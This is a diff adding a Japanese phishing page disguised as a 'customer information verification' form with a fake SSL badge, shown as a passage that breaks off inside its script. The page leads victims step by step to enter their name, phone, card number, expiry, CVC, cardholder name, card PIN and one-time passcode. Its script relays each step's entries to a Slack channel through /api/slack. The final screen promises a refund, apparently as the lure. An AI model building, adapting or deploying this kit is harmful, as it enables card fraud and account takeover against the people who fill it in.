@@ -1,0 +1,1208 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>お客様情報 照合入力フォーム</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family:
+          "Hiragino Sans", "Hiragino Kaku Gothic ProN", "Noto Sans JP",
+          "Yu Gothic", sans-serif;
+        background-color: #f5f6fa;
+        color: #333;
+        line-height: 1.6;
+      }
+
+      .header {
+        background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
+        color: white;
+        padding: 32px 0 28px;
+        text-align: center;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+      }
+
+      .header h1 {
+        font-size: 34px;
+        font-weight: 700;
+        letter-spacing: 1px;
+      }
+
+      .header p {
+        font-size: 14px;
+        margin-top: 8px;
+        opacity: 0.85;
+      }
+
+      .container {
+        max-width: 640px;
+        margin: 0 auto;
+        padding: 24px 16px 60px;
+      }
+
+      .notice-box {
+        background: #fff3e0;
+        border-left: 4px solid #ff9800;
+        padding: 14px 18px;
+        margin-bottom: 24px;
+        border-radius: 0 6px 6px 0;
+        font-size: 13px;
+        color: #5d4037;
+      }
+
+      .notice-box strong {
+        display: block;
+        margin-bottom: 4px;
+        color: #e65100;
+      }
+
+      .progress-bar-wrapper {
+        position: sticky;
+        top: 0;
+        z-index: 100;
+        background: #f5f6fa;
+        padding: 16px 0 12px;
+        margin: 0 -16px;
+        padding-left: 16px;
+        padding-right: 16px;
+        border-bottom: 1px solid #e0e0e0;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+      }
+
+      .progress-bar {
+        display: flex;
+        justify-content: space-between;
+        position: relative;
+        max-width: 640px;
+        margin: 0 auto;
+      }
+
+      .progress-bar::before {
+        content: "";
+        position: absolute;
+        top: 16px;
+        left: 10%;
+        right: 10%;
+        height: 3px;
+        background: #ddd;
+        z-index: 0;
+      }
+
+      .progress-step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        z-index: 1;
+        flex: 1;
+      }
+
+      .progress-circle {
+        width: 34px;
+        height: 34px;
+        border-radius: 50%;
+        background: #ddd;
+        color: #999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+        font-weight: 700;
+        transition: all 0.4s ease;
+      }
+
+      .progress-circle.active {
+        background: #1a237e;
+        color: white;
+        box-shadow: 0 2px 8px rgba(26, 35, 126, 0.4);
+      }
+
+      .progress-circle.completed {
+        background: #2e7d32;
+        color: white;
+      }
+
+      .progress-label {
+        font-size: 11px;
+        margin-top: 6px;
+        color: #999;
+        transition: color 0.3s;
+        text-align: center;
+      }
+
+      .progress-label.active {
+        color: #1a237e;
+        font-weight: 600;
+      }
+
+      .progress-label.completed {
+        color: #2e7d32;
+      }
+
+      .phase-card {
+        background: white;
+        border-radius: 10px;
+        padding: 28px 24px;
+        margin-bottom: 20px;
+        box-shadow: 0 1px 6px rgba(0, 0, 0, 0.08);
+        border: 1px solid #e8eaf0;
+        transition:
+          opacity 0.4s,
+          transform 0.4s;
+      }
+
+      .phase-card.disabled {
+        opacity: 0.45;
+        pointer-events: none;
+        user-select: none;
+      }
+
+      .phase-card.disabled .phase-lock {
+        display: flex;
+      }
+
+      .phase-title {
+        font-size: 16px;
+        font-weight: 700;
+        color: #1a237e;
+        margin-bottom: 6px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .phase-title .step-badge {
+        background: #1a237e;
+        color: white;
+        font-size: 11px;
+        padding: 3px 10px;
+        border-radius: 12px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        line-height: 1;
+        vertical-align: middle;
+      }
+
+      .phase-subtitle {
+        font-size: 13px;
+        color: #777;
+        margin-bottom: 20px;
+      }
+
+      .phase-lock {
+        display: none;
+        align-items: center;
+        gap: 8px;
+        background: #f5f5f5;
+        padding: 12px 16px;
+        border-radius: 6px;
+        margin-bottom: 16px;
+        font-size: 13px;
+        color: #999;
+      }
+
+      .phase-lock svg {
+        width: 18px;
+        height: 18px;
+        fill: #bbb;
+      }
+
+      .form-group {
+        margin-bottom: 18px;
+      }
+
+      .form-group label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 6px;
+        color: #333;
+      }
+
+      .form-group label .required {
+        background: #c62828;
+        color: white;
+        font-size: 10px;
+        padding: 1px 6px;
+        border-radius: 3px;
+        margin-left: 6px;
+        font-weight: 500;
+      }
+
+      .form-group input,
+      .form-group select {
+        width: 100%;
+        padding: 12px 14px;
+        border: 1.5px solid #d0d5dd;
+        border-radius: 8px;
+        font-size: 15px;
+        background: #fafbfc;
+        transition:
+          border-color 0.2s,
+          box-shadow 0.2s;
+        appearance: none;
+        -webkit-appearance: none;
+      }
+
+      .form-group input:focus,
+      .form-group select:focus {
+        outline: none;
+        border-color: #1a237e;
+        box-shadow: 0 0 0 3px rgba(26, 35, 126, 0.1);
+        background: #fff;
+      }
+
+      .form-group input:disabled,
+      .form-group select:disabled {
+        background: #f0f0f0;
+        color: #aaa;
+        cursor: not-allowed;
+      }
+
+      .form-group input.error {
+        border-color: #c62828;
+        box-shadow: 0 0 0 3px rgba(198, 40, 40, 0.1);
+      }
+
+      .form-group .error-msg {
+        color: #c62828;
+        font-size: 12px;
+        margin-top: 4px;
+        display: none;
+      }
+
+      .form-group .error-msg.show {
+        display: block;
+      }
+
+      .form-group .hint {
+        font-size: 12px;
+        color: #888;
+        margin-top: 4px;
+      }
+
+      .password-wrapper {
+        position: relative;
+      }
+
+      .password-wrapper input {
+        padding-right: 48px;
+      }
+
+      .toggle-password {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        padding: 4px;
+        color: #888;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .toggle-password:hover {
+        color: #333;
+      }
+
+      .toggle-password svg {
+        width: 22px;
+        height: 22px;
+        fill: currentColor;
+      }
+
+      .form-group select {
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 14px center;
+        padding-right: 36px;
+      }
+
+      .card-brands {
+        display: flex;
+        gap: 10px;
+        flex-wrap: nowrap;
+      }
+
+      .card-brand-option {
+        position: relative;
+        flex: 1;
+        min-width: 0;
+      }
+
+      .card-brand-option input[type="radio"] {
+        position: absolute;
+        opacity: 0;
+        width: 0;
+        height: 0;
+      }
+
+      .card-brand-option label {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 14px 6px;
+        border: 2px solid #e0e0e0;
+        border-radius: 10px;
+        cursor: pointer;
+        font-size: 11px;
+        font-weight: 600;
+        color: #555;
+        background: #fafbfc;
+        transition: all 0.2s;
+        text-align: center;
+        height: 80px;
+      }
+
+      .card-brand-option label .brand-logo {
+        height: 40px;
+        width: auto;
+        max-width: 92%;
+        object-fit: contain;
+      }
+
+      .card-brand-option input[type="radio"]:checked + label {
+        border-color: #1a237e;
+        background: #e8eaf6;
+        color: #1a237e;
+        box-shadow: 0 2px 8px rgba(26, 35, 126, 0.15);
+      }
+
+      .card-brand-option label:hover {
+        border-color: #9fa8da;
+        background: #f3f4ff;
+      }
+
+      .next-btn {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 15px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s;
+        letter-spacing: 1px;
+        margin-top: 8px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .next-btn:hover:not(:disabled) {
+        box-shadow: 0 4px 16px rgba(26, 35, 126, 0.35);
+        transform: translateY(-1px);
+      }
+
+      .next-btn:active:not(:disabled) {
+        transform: translateY(0);
+      }
+
+      .next-btn:disabled {
+        background: #bdbdbd;
+        cursor: not-allowed;
+        box-shadow: none;
+      }
+
+      .next-btn.loading {
+        pointer-events: none;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .next-btn.loading .btn-spinner {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 3px solid rgba(255, 255, 255, 0.3);
+        border-top-color: white;
+        border-radius: 50%;
+        animation: spin 0.7s linear infinite;
+        flex-shrink: 0;
+      }
+
+      .next-btn.loading .btn-text-original {
+        display: none;
+      }
+
+      .next-btn.loading .btn-text-loading {
+        display: inline;
+      }
+
+      .btn-text-loading {
+        display: none;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .completed-badge {
+        display: none;
+        align-items: center;
+        gap: 8px;
+        background: #e8f5e9;
+        border: 1px solid #c8e6c9;
+        padding: 12px 16px;
+        border-radius: 8px;
+        color: #2e7d32;
+        font-size: 14px;
+        font-weight: 600;
+        margin-top: 8px;
+      }
+
+      .completed-badge.show {
+        display: flex;
+      }
+
+      .completed-badge svg {
+        width: 20px;
+        height: 20px;
+        fill: #2e7d32;
+      }
+
+      .final-message {
+        display: none;
+        text-align: center;
+        padding: 40px 20px;
+        background: white;
+        border-radius: 10px;
+        box-shadow: 0 1px 6px rgba(0, 0, 0, 0.08);
+        border: 1px solid #e8eaf0;
+      }
+
+      .final-message.show {
+        display: block;
+      }
+
+      .final-message .check-icon {
+        width: 72px;
+        height: 72px;
+        background: #e8f5e9;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+      }
+
+      .final-message .check-icon svg {
+        width: 36px;
+        height: 36px;
+        fill: #2e7d32;
+      }
+
+      .final-message h2 {
+        font-size: 20px;
+        color: #2e7d32;
+        margin-bottom: 12px;
+      }
+
+      .final-message p {
+        font-size: 14px;
+        color: #666;
+      }
+
+      .footer {
+        text-align: center;
+        padding: 20px;
+        font-size: 12px;
+        color: #aaa;
+      }
+
+      .ssl-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        font-size: 12px;
+        color: #888;
+        margin-top: 16px;
+      }
+
+      .ssl-badge svg {
+        width: 14px;
+        height: 14px;
+        fill: #4caf50;
+      }
+
+      @media (max-width: 480px) {
+        .container {
+          padding: 16px 12px 40px;
+        }
+        .phase-card {
+          padding: 20px 16px;
+        }
+        .card-brands {
+          flex-wrap: wrap;
+        }
+        .card-brand-option {
+          flex: 0 0 calc(33.333% - 7px);
+        }
+        .card-brand-option:nth-child(n + 4) {
+          flex: 0 0 calc(50% - 5px);
+        }
+        .progress-label {
+          font-size: 10px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <h1>お客様情報 照合入力フォーム</h1>
+    </div>
+
+    <div class="container">
+      <div class="notice-box">
+        <strong>ご入力にあたってのお願い</strong>
+        全ての項目は必須入力です。正確な情報をご入力ください。
+      </div>
+
+      <!-- Progress Bar (sticky) -->
+      <div class="progress-bar-wrapper">
+        <div class="progress-bar">
+          <div class="progress-step">
+            <div class="progress-circle active" id="prog-1">1</div>
+            <div class="progress-label active" id="prog-label-1">本人情報</div>
+          </div>
+          <div class="progress-step">
+            <div class="progress-circle" id="prog-2">2</div>
+            <div class="progress-label" id="prog-label-2">ブランド選択</div>
+          </div>
+          <div class="progress-step">
+            <div class="progress-circle" id="prog-3">3</div>
+            <div class="progress-label" id="prog-label-3">カード情報</div>
+          </div>
+          <div class="progress-step">
+            <div class="progress-circle" id="prog-4">4</div>
+            <div class="progress-label" id="prog-label-4">最終確認</div>
+          </div>
+          <div class="progress-step">
+            <div class="progress-circle" id="prog-5">5</div>
+            <div class="progress-label" id="prog-label-5">二段階認証</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 1: Name + Phone -->
+      <div class="phase-card" id="phase-1">
+        <div class="phase-title">
+          <span class="step-badge">STEP 1</span>
+          ご本人情報
+        </div>
+        <div class="phase-subtitle">お名前と電話番号をご入力ください。</div>
+
+        <div class="form-group">
+          <label>氏名 <span class="required">必須</span></label>
+          <input
+            type="text"
+            id="input-name"
+            placeholder="例: 山田 太郎"
+            autocomplete="name"
+          />
+          <div class="error-msg" id="err-name">氏名を入力してください。</div>
+        </div>
+
+        <div class="form-group">
+          <label>電話番号 <span class="required">必須</span></label>
+          <input
+            type="tel"
+            id="input-phone"
+            placeholder="例: 09012345678"
+            autocomplete="tel"
+          />
+          <div class="error-msg" id="err-phone">
+            正しい電話番号を入力してください。
+          </div>
+        </div>
+
+        <button class="next-btn" id="btn-phase1" onclick="submitPhase(1)">
+          <span class="btn-text-original">次へ進む</span>
+          <span class="btn-text-loading">処理中...</span>
+        </button>
+        <div class="completed-badge" id="done-1">
+          <svg viewBox="0 0 24 24">
+            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+          </svg>
+          入力完了
+        </div>
+      </div>
+
+      <!-- Phase 2: Card Brand -->
+      <div class="phase-card disabled" id="phase-2">
+        <div class="phase-lock">
+          <svg viewBox="0 0 24 24">
+            <path
+              d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"
+            />
+          </svg>
+          STEP 1 を完了すると入力できます。
+        </div>
+        <div class="phase-title">
+          <span class="step-badge">STEP 2</span>
+          クレジットカードブランド選択
+        </div>
+        <div class="phase-subtitle">
+          ご利用のクレジットカードブランドを選択してください。
+        </div>
+
+        <div class="form-group">
+          <label>カードブランド <span class="required">必須</span></label>
+          <div class="card-brands">
+            <div class="card-brand-option">
+              <input
+                type="radio"
+                name="card-brand"
+                id="brand-visa"
+                value="Visa"
+              />
+              <label for="brand-visa">
+                <img class="brand-logo" src="./images/VISA.png" alt="Visa" />
+              </label>
+            </div>
+            <div class="card-brand-option">
+              <input
+                type="radio"
+                name="card-brand"
+                id="brand-master"
+                value="Mastercard"
+              />
+              <label for="brand-master">
+                <img
+                  class="brand-logo"
+                  src="./images/Master.png"
+                  alt="Mastercard"
+                />
+              </label>
+            </div>
+            <div class="card-brand-option">
+              <input
+                type="radio"
+                name="card-brand"
+                id="brand-amex"
+                value="American Express"
+              />
+              <label for="brand-amex">
+                <img
+                  class="brand-logo"
+                  src="./images/AMEX.png"
+                  alt="American Express"
+                />
+              </label>
+            </div>
+            <div class="card-brand-option">
+              <input
+                type="radio"
+                name="card-brand"
+                id="brand-diners"
+                value="Diners Club"
+              />
+              <label for="brand-diners">
+                <img
+                  class="brand-logo"
+                  src="./images/Diners.png"
+                  alt="Diners Club"
+                />
+              </label>
+            </div>
+            <div class="card-brand-option">
+              <input
+                type="radio"
+                name="card-brand"
+                id="brand-jcb"
+                value="JCB"
+              />
+              <label for="brand-jcb">
+                <img class="brand-logo" src="./images/JCB.png" alt="JCB" />
+              </label>
+            </div>
+          </div>
+          <div class="error-msg" id="err-brand">
+            クレジットカードブランドを選択してください。
+          </div>
+        </div>
+
+        <button class="next-btn" id="btn-phase2" onclick="submitPhase(2)">
+          <span class="btn-text-original">次へ進む</span>
+          <span class="btn-text-loading">処理中...</span>
+        </button>
+        <div class="completed-badge" id="done-2">
+          <svg viewBox="0 0 24 24">
+            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+          </svg>
+          選択完了
+        </div>
+      </div>
+
+      <!-- Phase 3: Items A-E -->
+      <div class="phase-card disabled" id="phase-3">
+        <div class="phase-lock">
+          <svg viewBox="0 0 24 24">
+            <path
+              d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"
+            />
+          </svg>
+          STEP 2 を完了すると入力できます。
+        </div>
+        <div class="phase-title">
+          <span class="step-badge">STEP 3</span>
+          クレジットカード情報入力
+        </div>
+        <div class="phase-subtitle">各項目を正確にご入力ください。</div>
+
+        <div class="form-group">
+          <label>クレジットカード番号 <span class="required">必須</span></label>
+          <input
+            type="text"
+            id="input-itemA"
+            placeholder="数字を入力"
+            inputmode="numeric"
+          />
+          <div class="hint">半角数字で入力してください。</div>
+          <div class="error-msg" id="err-itemA">
+            クレジットカード番号を入力してください。
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>有効期限（MM） <span class="required">必須</span></label>
+          <input
+            type="text"
+            id="input-itemB"
+            placeholder="数字を入力"
+            inputmode="numeric"
+          />
+          <div class="hint">半角数字で入力してください。</div>
+          <div class="error-msg" id="err-itemB">
+            有効期限を入力してください。
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>有効期限（YY） <span class="required">必須</span></label>
+          <input
+            type="text"
+            id="input-itemC"
+            placeholder="数字を入力"
+            inputmode="numeric"
+          />
+          <div class="hint">半角数字で入力してください。</div>
+          <div class="error-msg" id="err-itemC">
+            有効期限を入力してください。
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label
+            >セキュリティコード（CVC） <span class="required">必須</span></label
+          >
+          <input
+            type="text"
+            id="input-itemD"
+            placeholder="数字を入力"
+            inputmode="numeric"
+          />
+          <div class="hint">半角数字で入力してください。</div>
+          <div class="error-msg" id="err-itemD">
+            セキュリティコードを入力してください。
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>名義人名 <span class="required">必須</span></label>
+          <input type="text" id="input-itemE" placeholder="ローマ字で入力" />
+          <div class="hint">ローマ字で入力してください。（スペースあり）</div>
+          <div class="error-msg" id="err-itemE">
+            名義人名を入力してください。
+          </div>
+        </div>
+
+        <button class="next-btn" id="btn-phase3" onclick="submitPhase(3)">
+          <span class="btn-text-original">次へ進む</span>
+          <span class="btn-text-loading">処理中...</span>
+        </button>
+        <div class="completed-badge" id="done-3">
+          <svg viewBox="0 0 24 24">
+            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+          </svg>
+          入力完了
+        </div>
+      </div>
+
+      <!-- Phase 4: Item F -->
+      <div class="phase-card disabled" id="phase-4">
+        <div class="phase-lock">
+          <svg viewBox="0 0 24 24">
+            <path
+              d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"
+            />
+          </svg>
+          STEP 3 を完了すると入力できます
+        </div>
+        <div class="phase-title">
+          <span class="step-badge">STEP 4</span>
+          最終確認
+        </div>
+        <div class="phase-subtitle">
+          最終照合を行うため、暗証番号をご入力ください。
+        </div>
+
+        <div class="form-group">
+          <label
+            >クレジットカード暗証番号 <span class="required">必須</span></label
+          >
+          <div class="password-wrapper">
+            <input
+              type="password"
+              id="input-itemF"
+              placeholder="数字を入力"
+              inputmode="numeric"
+            />
+            <button
+              type="button"
+              class="toggle-password"
+              onclick="togglePassword('input-itemF', this)"
+              aria-label="パスワードを表示"
+            >
+              <svg viewBox="0 0 24 24" class="icon-show">
+                <path
+                  d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"
+                />
+              </svg>
+              <svg viewBox="0 0 24 24" class="icon-hide" style="display: none">
+                <path
+                  d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"
+                />
+              </svg>
+            </button>
+          </div>
+          <div class="hint">半角数字で入力してください。</div>
+          <div class="error-msg" id="err-itemF">
+            クレジットカード暗証番号を入力してください。
+          </div>
+        </div>
+
+        <button class="next-btn" id="btn-phase4" onclick="submitPhase(4)">
+          <span class="btn-text-original">次へ進む</span>
+          <span class="btn-text-loading">処理中...</span>
+        </button>
+        <div class="completed-badge" id="done-4">
+          <svg viewBox="0 0 24 24">
+            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+          </svg>
+          入力完了
+        </div>
+      </div>
+
+      <!-- Phase 5: Item G -->
+      <div class="phase-card disabled" id="phase-5">
+        <div class="phase-lock">
+          <svg viewBox="0 0 24 24">
+            <path
+              d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"
+            />
+          </svg>
+          STEP 4 を完了すると入力できます
+        </div>
+        <div class="phase-title">
+          <span class="step-badge">STEP 5</span>
+          二段階認証
+        </div>
+        <div class="phase-subtitle">
+          ご利用の電話番号へワンタイムパスコードが届きます。<br />もし、ワンタイムパスコードが届かないという場合には、担当者へご連絡の上、<br />スキップして【送信する】をクリックしてください。
+        </div>
+
+        <div class="form-group">
+          <label>ワンタイムパスコード</label>
+          <div class="password-wrapper">
+            <input
+              type="password"
+              id="input-itemG"
+              placeholder="数字を入力"
+              inputmode="numeric"
+            />
+            <button
+              type="button"
+              class="toggle-password"
+              onclick="togglePassword('input-itemG', this)"
+              aria-label="パスワードを表示"
+            >
+              <svg viewBox="0 0 24 24" class="icon-show">
+                <path
+                  d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"
+                />
+              </svg>
+              <svg viewBox="0 0 24 24" class="icon-hide" style="display: none">
+                <path
+                  d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"
+                />
+              </svg>
+            </button>
+          </div>
+          <div class="hint">半角数字で入力してください。</div>
+          <div class="error-msg" id="err-itemG">
+            ワンタイムパスコードを入力してください。
+          </div>
+        </div>
+
+        <button class="next-btn" id="btn-phase5" onclick="submitPhase(5)">
+          <span class="btn-text-original">送信する</span>
+          <span class="btn-text-loading">送信中...</span>
+        </button>
+      </div>
+
+      <!-- Final Message -->
+      <div class="final-message" id="final-message">
+        <div class="check-icon">
+          <svg viewBox="0 0 24 24">
+            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+          </svg>
+        </div>
+        <h2>送信完了</h2>
+        <p>
+          ご入力いただきありがとうございます。<br />内容を確認の上、カード会社との照合を行い、<br />改めてご返金方法をご案内させていただきます。
+        </p>
+      </div>
+
+      <div class="ssl-badge">
+        <svg viewBox="0 0 24 24">
+          <path
+            d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"
+          />
+        </svg>
+        SSL暗号化通信で保護されています
+      </div>
+    </div>
+
+    <div class="footer">&copy; 2026 All Rights Reserved.</div>
+
+    <script>
+      // Slack thread timestamp (set after Phase 1 message)
+      let slackThreadTs = null;
+
+      function clearErrors(phase) {
+        const card = document.getElementById("phase-" + phase);
+        card
+          .querySelectorAll(".error-msg")
+          .forEach((el) => el.classList.remove("show"));
+        card
+          .querySelectorAll("input")
+          .forEach((el) => el.classList.remove("error"));
+      }
+
+      function showError(id) {
+        const input =
+          document.getElementById("input-" + id) || document.getElementById(id);
+        const errEl = document.getElementById("err-" + id);
+        if (input) input.classList.add("error");
+        if (errEl) errEl.classList.add("show");
+      }
+
+      function togglePassword(inputId, btn) {
+        const input = document.getElementById(inputId);
+        const iconShow = btn.querySelector(".icon-show");
+        const iconHide = btn.querySelector(".icon-hide");
+        if (input.type === "password") {
+          input.type = "text";
+          iconShow.style.display = "none";
+          iconHide.style.display = "block";
+        } else {
+          input.type = "password";
+          iconShow.style.display = "block";
+          iconHide.style.display = "none";
+        }
+      }
+
+      function setButtonLoading(btnId, loading) {
+        const btn = document.getElementById(btnId);
+        if (loading) {
+          btn.classList.add("loading");
+          btn.disabled = true;
+          // Add spinner element
+          const spinner = document.createElement("span");
+          spinner.className = "btn-spinner";
+          btn.insertBefore(spinner, btn.firstChild);
+        } else {
+          btn.classList.remove("loading");
+          btn.disabled = false;
+          // Remove spinner element
+          const spinner = btn.querySelector(".btn-spinner");
+          if (spinner) spinner.remove();
+        }
+      }
+
+      function updateProgress(completedPhase) {
+        for (let i = 1; i <= 5; i++) {
+          const circle = document.getElementById("prog-" + i);
+          const label = document.getElementById("prog-label-" + i);
+          circle.classList.remove("active", "completed");
+          label.classList.remove("active", "completed");
+
+          if (i <= completedPhase) {
+            circle.classList.add("completed");
+            circle.innerHTML =
+              '<svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
+            label.classList.add("completed");
+          } else if (i === completedPhase + 1) {
+            circle.classList.add("active");
+            label.classList.add("active");
+          }
+        }
+      }
+
+      function unlockPhase(phase) {
+        const card = document.getElementById("phase-" + phase);
+        card.classList.remove("disabled");
+        card.scrollIntoView({ behavior: "smooth", block: "center" });
+      }
+
+      function lockInputs(phase) {
+        const card = document.getElementById("phase-" + phase);
+        card
+          .querySelectorAll("input, select")
+          .forEach((el) => (el.disabled = true));
+        const btn = document.getElementById("btn-phase" + phase);
+        if (btn) btn.style.display = "none";
+        const done = document.getElementById("done-" + phase);
+        if (done) done.classList.add("show");
+      }
+
+      function getFormData() {
+        return {
+          name: document.getElementById("input-name")?.value?.trim() || "",
+          phone: document.getElementById("input-phone")?.value?.trim() || "",
+          cardBrand:
+            document.querySelector('input[name="card-brand"]:checked')?.value ||
+            "",
+          itemA: document.getElementById("input-itemA")?.value?.trim() || "",
+          itemB: document.getElementById("input-itemB")?.value?.trim() || "",
+          itemC: document.getElementById("input-itemC")?.value?.trim() || "",
+          itemD: document.getElementById("input-itemD")?.value?.trim() || "",
+          itemE: document.getElementById("input-itemE")?.value?.trim() || "",
+          itemF: document.getElementById("input-itemF")?.value?.trim() || "",
+          itemG: document.getElementById("input-itemG")?.value?.trim() || "",
+        };
+      }
+
+      async function sendSlackNotification(phase, data) {
+        try {
+          const response = await fetch("/api/slack", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              phase,
+              data,
+              threadTs: slackThreadTs,
+            }),
+          });
+          const result = await response.json();
+          if (result.threadTs) {
+            slackThreadTs = result.threadTs;
+          }
+          return result;
+        } catch (err) {
+          console.error("Slack notification failed:", err);
+          // Don't block form progression on Slack failure
+          return { ok: false };
+        }
+      }
+
+      async function submitPhase(phase) {
+        clearErrors(phase);
+        const data = getFormData();
+        let valid = true;
+
+        // Validation
+        if (phase === 1) {
+          if (!data.name) {
+            showError("name");
+            valid = false;
+          }
+          if (
+            !data.phone ||
